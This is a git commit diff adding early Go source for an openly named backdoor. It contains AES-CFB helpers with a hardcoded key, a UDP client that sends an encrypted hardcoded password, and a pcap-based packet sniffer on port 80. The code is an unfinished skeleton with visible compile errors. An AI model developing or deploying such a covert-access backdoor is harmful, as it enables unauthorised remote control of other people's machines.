7df5f92ed7958d22d5d9d0bea3733934a305664c
Ramzi Chennafi <razc411@hotmail.ca>
2015-10-16 12:04:33 -0700

    Modified directory, working on backdoor sniffing.

---
+++ bdencrypt.go
@@ -0,0 +1,38 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/hex"
+)
+
+var iv []byte;
+var block cipher.Block;
+
+func intiateTools(){
+
+	keytext := (([]byte)("s92jmc912hfye>p[c620cmi:pqinuysh"));
+	block, _ = aes.NewCipher(keytext);
+	ciphercode, _ := hex.DecodeString("a09c2cb3d389f6901176cbbd5ba9535f87f4f1532325bc9ecf336bb209073e7725f0a21255ab4cdf97a3a74ad0286b6d637145476af6dd740bad9214912f79de66190aef6e7a6789f46be6bf654286bf17c53a1d8c399ccdd4c59ac1c1df108709cc7690");
+	iv = ciphercode[:aes.BlockSize];
+}
+
+func encrypt_data(data string) []byte {
+	
+	text := ([]byte(data));
+	
+	cfb := cipher.NewCFBEncrypter(block, iv);
+	ciphertext := make([]byte, len(text));
+	cfb.XORKeyStream(ciphertext, text);
+
+	return ciphertext;
+}
+
+func decrypt_data(data []byte) []byte {
+	
+	cfbdec := cipher.NewCFBDecrypter(block, iv);
+	plaintextCopy := make([]byte, len(data));
+	cfbdec.XORKeyStream(plaintextCopy, data);
+
+	return plaintextCopy;
+}
--- bdmain.go
+++ bdmain.go
@@ -7,9 +7,13 @@ import(
 	"flag"
 	"fmt"
 	"github.com/google/gopacket/layers"
+	"golang.org/x/crypto/ssh/terminal"
+	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket"
 	"net"
 )
+
+const passwd = "DAMNPANDIMENSIONALMICE";
 
 func main(){
 
@@ -22,21 +26,98 @@ func main(){
 	portPtr := flag.Int("port", 80, "The port to connect to in client mode, or to listen on in server mode. Defaults to 80.");
 
 	flag.Parse();
+
+	intiateTools();
 	
 	switch *modePtr {
 	case "client":
 		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
+		intiateClient(*ipPtr, *portPtr);
 		break;
 	case "server":
-		fmt.Printf("Running in server mode. Listening on port %d.\n", *portPtr);
+		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
+		intiateServer();
 	}
 }
 
-func intiateClient(ip String, port int){
+func GetLocalIP() string {
+    addrs, err := net.InterfaceAddrs()
+    if err != nil {
+        return "";
+    }
+    for _, address := range addrs {
+        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+            if ipnet.IP.To4() != nil {
+                return ipnet.IP.String();
+            }
+        }
+    }
+    return "";
+}
 
-	ip := &layers.IPv4{
-		SrcIP: net.ParseIP(ip);
-		
+// func sendKnock(ip String, port int){
+//
+//              ip := &layers.IPv4{
+// 		Version: 4,
+// 		IHL: 5,
+// 		TOS: 0,
+// 		Length: sizeof(struct IPv4) + sizeof(struct TCP),
+// 		Id: 0,
+// 		Flags: 0,
+// 		FragOffset: 0,
+// 		TTL: 255,
+// 		Protocol: IPProtocolUDP,
+// 		Checksum: 0,
+// 		SrcIP: GetLocalIP(),
+// 		DstIP: net.ParseIP(ip),
+// 	}
+// }	
+
+func intiateClient(ip string, port int){
+
+	hostaddr := fmt.Sprintf("%s:%d", ip, port);
+	conn, err := net.Dial("udp", hostaddr);
+	if err != nil {
+		fmt.Printf("Failed to dial server at %s.\n", hostaddr);
+		os.Exit(1);
+	}
+
+	defer conn.Close();
+
+	for {
+		fmt.Print("Please input the authentication code: ");
+		authcode, _ := terminal.ReadPassword(0);
+		authstr := string(authcode);
+
+		if authstr == passwd {
+			ciphertext := encrypt_data(authstr);
+			fmt.Fprint(conn, "%s", ciphertext);
+			break;
+		}
+		fmt.Print("\nInvalid authentication code, try again.\n");
+	}	
+}
+
+func intiateServer(){
+
+	if handle, err := pcap.OpenLive("wlan0", 1600, true, pcap.BlockForever); err != nil {
+		panic(err)
+	} else if err := handle.SetBPFFilter("tcp and port 80"); err != nil {  // optional
+		panic(err)
+	} else {
+		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+		for packet := range packetSource.Packets() {
+			layerpacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
+			if tcpLayer := layerpacket.Layer(layers.LayerTypeTCP); tcpLayer != nil {
+				fmt.Println("This is a TCP packet!")
+				tcp, _ := tcpLayer.(*layers.TCP)
+			}
+			
+			for _, layer := range layerpacket.Layers() {
+				fmt.Println("PACKET LAYER:", layer.LayerType())
+			}
+		}
+	}
 }
 
 
